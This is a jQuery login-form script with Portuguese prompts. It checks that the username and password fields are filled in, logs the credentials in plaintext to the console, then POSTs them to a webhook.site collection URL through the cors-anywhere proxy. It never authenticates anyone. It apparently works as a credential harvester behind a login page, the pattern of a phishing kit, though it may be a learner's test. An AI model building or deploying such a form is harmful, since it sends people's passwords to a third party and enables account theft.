$(document).ready(function () {
    $("#loginForm").on("submit", function (event) {
        let isValid = true; // Use 'let' instead of 'const'

        // Validate username
        if ($("input[name='username']").val().trim() === "") {
            $("#usernameTooltip").text("Por favor, insira seu nome de usuário.").show();
            isValid = false;
        } else {
            $("#usernameTooltip").hide();
        }

        // Validate password
        if ($("input[name='password']").val().trim() === "") {
            $("#passwordTooltip").text("Por favor, insira sua senha.").show();
            isValid = false;
        } else {
            $("#passwordTooltip").hide();
        }

        if (!isValid) {
            event.preventDefault(); // Prevent form from submitting
            return; // Stop the function if the form is not valid
        }

        // If the form is valid, proceed to send data
        const dadosUser = {
            user: $("input[name='username']").val(),
            senha: $("input[name='password']").val().trim()
        };
        console.log(dadosUser);

        async function postData() {
            const url = 'https://cors-anywhere.herokuapp.com/https://webhook.site/a7ae1c21-813e-465a-9a4b-4e07c48c34e5';
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(dadosUser), // Send dadosUser instead of static data
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                const responseData = await response.json();
                console.log('Response Data:', responseData);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }

        postData(); // Call postData if the form is valid
    });
});
